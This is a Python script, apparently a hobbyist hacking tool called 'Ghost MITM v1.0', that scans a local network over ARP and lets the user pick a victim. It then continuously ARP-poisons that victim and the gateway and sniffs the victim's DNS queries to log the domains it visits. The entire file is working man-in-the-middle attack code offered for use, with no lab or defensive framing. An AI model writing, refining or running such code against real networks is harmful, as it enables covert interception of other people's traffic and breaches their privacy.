#!/usr/bin/env python3
import argparse, threading, time
from colorama import Fore, Style, init
from scapy.all import *
from netaddr import EUI

init(autoreset=True)

spinner = ['⣾','⣽','⣻','⢿','⡿','⣟','⣯','⣷']

def banner():
    print(f"""{Fore.RED}
    ╔═╗╔═╗╔═╗╦═╗╔╦╗╔═╗
    ╠═╣╠═╝║ ║╠╦╝ ║ ╚═╗
    ╩ ╩╩  ╚═╝╩╚═ ╩ ╚═╝
    ╔╦╗╦╔═╗╔═╗╔═╗╔╦╗
     ║ ║║ ║╠═╝║ ║ ║ 
     ╩ ╩╚═╝╩  ╚═╝ ╩ 
    {Fore.CYAN}       by Jusot
    {Fore.YELLOW}   Ghost MITM v1.0
    {Style.RESET_ALL}""")

def scan_network(network, interface):
    print(f"{Fore.CYAN}🎯 Scanning {network} on {interface}...{Style.RESET_ALL}")
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=network), timeout=5, iface=interface, verbose=0)
    
    hosts = []
    for i, packet in enumerate(ans):
        ip, mac = packet.answer[ARP].psrc, packet.answer[ARP].hwsrc
        try: 
            vendor = EUI(mac).oui.registration().org[:20]
        except: 
            vendor = "Unknown"
        
        spinner_char = spinner[i % len(spinner)]
        print(f"\r{Fore.CYAN}{spinner_char} Found: {Fore.GREEN}{ip} {Fore.YELLOW}{mac} {Fore.MAGENTA}{vendor}", end="")
        hosts.append((ip, mac, vendor))
        time.sleep(0.1)
    
    print(f"\r{Fore.GREEN}✅ Scan complete - {len(hosts)} hosts found{' '*50}")
    return hosts

class GhostMITM:
    def __init__(self, target_ip, gateway_ip, interface):
        self.target_ip, self.gateway_ip, self.interface = target_ip, gateway_ip, interface
        self.running = True

    def start_attack(self):
        print(f"{Fore.RED}👻 Starting MITM: {self.target_ip} ↔ {self.gateway_ip}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}⚡ Press Ctrl+C to stop{Style.RESET_ALL}")
        threading.Thread(target=self.arp_poison, daemon=True).start()
        threading.Thread(target=self.sniff_traffic, daemon=True).start()
        
        try:
            while self.running: 
                time.sleep(1)
                print(f"\r{Fore.RED}{spinner[int(time.time()) % len(spinner)]} MITM Active - Jusot ghosting...", end="")
        except KeyboardInterrupt:
            self.running = False
            print(f"\n{Fore.YELLOW}🛑 MITM stopped by Jusot{Style.RESET_ALL}")

    def arp_poison(self):
        while self.running:
            send(ARP(op=2, pdst=self.target_ip, psrc=self.gateway_ip), verbose=0, iface=self.interface)
            send(ARP(op=2, pdst=self.gateway_ip, psrc=self.target_ip), verbose=0, iface=self.interface)
            time.sleep(2)

    def sniff_traffic(self):
        sniff(iface=self.interface, prn=self.process_packet, stop_filter=lambda x: not self.running, store=0)

    def process_packet(self, packet):
        if packet.haslayer(DNSQR):
            domain = packet[DNSQR].qname.decode().rstrip('.')
            timestamp = time.strftime("%H:%M:%S")
            print(f"\r{Fore.CYAN}🕐 {timestamp} | {Fore.GREEN}{self.target_ip} → {Fore.YELLOW}{domain}{' '*30}")

if __name__ == "__main__":
    banner()
    parser = argparse.ArgumentParser(description="👻 Ghost MITM - LAN Man-in-the-Middle by Jusot")
    parser.add_argument("network", help="Target network (e.g., 192.168.1.0/24)")
    parser.add_argument("-i", "--interface", required=True, help="Network interface")
    parser.add_argument("-g", "--gateway", required=True, help="Gateway IP")
    args = parser.parse_args()

    hosts = scan_network(args.network, args.interface)
    
    if not hosts:
        print(f"{Fore.RED}❌ No hosts found! Check network/interface.{Style.RESET_ALL}")
        exit(1)
    
    print(f"\n{Fore.YELLOW}🎯 Select target:{Style.RESET_ALL}")
    for i, (ip, mac, vendor) in enumerate(hosts):
        print(f"{Fore.CYAN}[{i}] {Fore.GREEN}{ip} {Fore.YELLOW}{mac} {Fore.MAGENTA}{vendor}")
    
    try:
        target_index = int(input(f"\n{Fore.YELLOW}🎯 Enter target number: {Style.RESET_ALL}"))
        target_ip = hosts[target_index][0]
    except:
        print(f"{Fore.RED}❌ Invalid selection!{Style.RESET_ALL}")
        exit(1)
    
    GhostMITM(target_ip, args.gateway, args.interface).start_attack()
